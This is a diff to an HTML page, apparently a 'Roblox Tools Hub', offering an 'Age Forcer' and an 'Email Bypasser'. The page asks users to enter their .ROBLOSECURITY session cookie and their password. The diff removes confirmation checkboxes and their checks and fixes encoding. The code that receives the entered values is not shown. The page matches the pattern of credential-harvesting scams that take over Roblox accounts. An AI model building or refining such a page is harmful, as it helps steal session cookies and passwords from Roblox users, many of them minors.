@@ -142,23 +142,6 @@
             font-size: 14px;
         }
         
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 25px 0;
-        }
-        
-        .checkbox-group input {
-            width: auto;
-            transform: scale(1.2);
-        }
-        
-        .checkbox-group label {
-            margin-bottom: 0;
-            font-weight: 500;
-        }
-        
         .btn {
             background: linear-gradient(to right, #6a4fff, #5a3fe0);
             color: white;
@@ -249,11 +232,6 @@
                     <small>This should be the value of your .ROBLOSECURITY cookie from Roblox</small>
                 </div>
                 
-                <div class="checkbox-group">
-                    <input type="checkbox" id="age-checkbox" checked>
-                    <label for="age-checkbox">Start Age Forcer</label>
-                </div>
-                
                 <button class="btn" id="age-btn">
                     <span>Start Age Forcer</span>
                 </button>
@@ -263,7 +241,7 @@
             
             <!-- Email Bypasser Tool -->
             <section id="email-tool" class="tool-section">
-                <h2>ðŸ“§ Email Bypasser</h2>
+                <h2>Email Bypasser</h2>
                 <p class="description">Enter your Roblox cookie and password to use the email bypasser tool</p>
                 
                 <div class="form-group">
@@ -278,11 +256,6 @@
                     <small>Required for authentication with bypass endpoints</small>
                 </div>
                 
-                <div class="checkbox-group">
-                    <input type="checkbox" id="email-checkbox" checked>
-                    <label for="email-checkbox">Start Email Bypasser</label>
-                </div>
-                
                 <button class="btn" id="email-btn">
                     <span>Start Email Bypasser</span>
                 </button>
@@ -292,7 +265,7 @@
         </main>
         
         <footer>
-            <p>Â© 2025 Roblox Tools Hub. Advanced account management.</p>
+            <p>© 2025 Roblox Tools Hub. Advanced account management.</p>
         </footer>
     </div>
 
@@ -316,17 +289,10 @@
         // Age Forcer functionality
         document.getElementById('age-btn').addEventListener('click', function() {
             const cookie = document.getElementById('age-cookie').value;
-            const checkbox = document.getElementById('age-checkbox').checked;
             const status = document.getElementById('age-status');
             
             if (!cookie) {
                 status.textContent = 'Please enter your Roblox security cookie.';
-                status.className = 'status error';
-                return;
-            }
-            
-            if (!checkbox) {
-                status.textContent = 'Please check the checkbox to proceed.';
                 status.className = 'status error';
                 return;
             }
@@ -346,17 +312,10 @@
         document.getElementById('email-btn').addEventListener('click', function() {
             const cookie = document.getElementById('email-cookie').value;
             const password = document.getElementById('email-password').value;
-            const checkbox = document.getElementById('email-checkbox').checked;
             const status = document.getElementById('email-status');
             
             if (!cookie || !password) {
                 status.textContent = 'Please fill in all required fields.';
-                status.className = 'status error';
-                return;
-            }
-            
-            if (!checkbox) {
-                status.textContent = 'Please check the checkbox to proceed.';
                 status.className = 'status error';
                 return;
             }
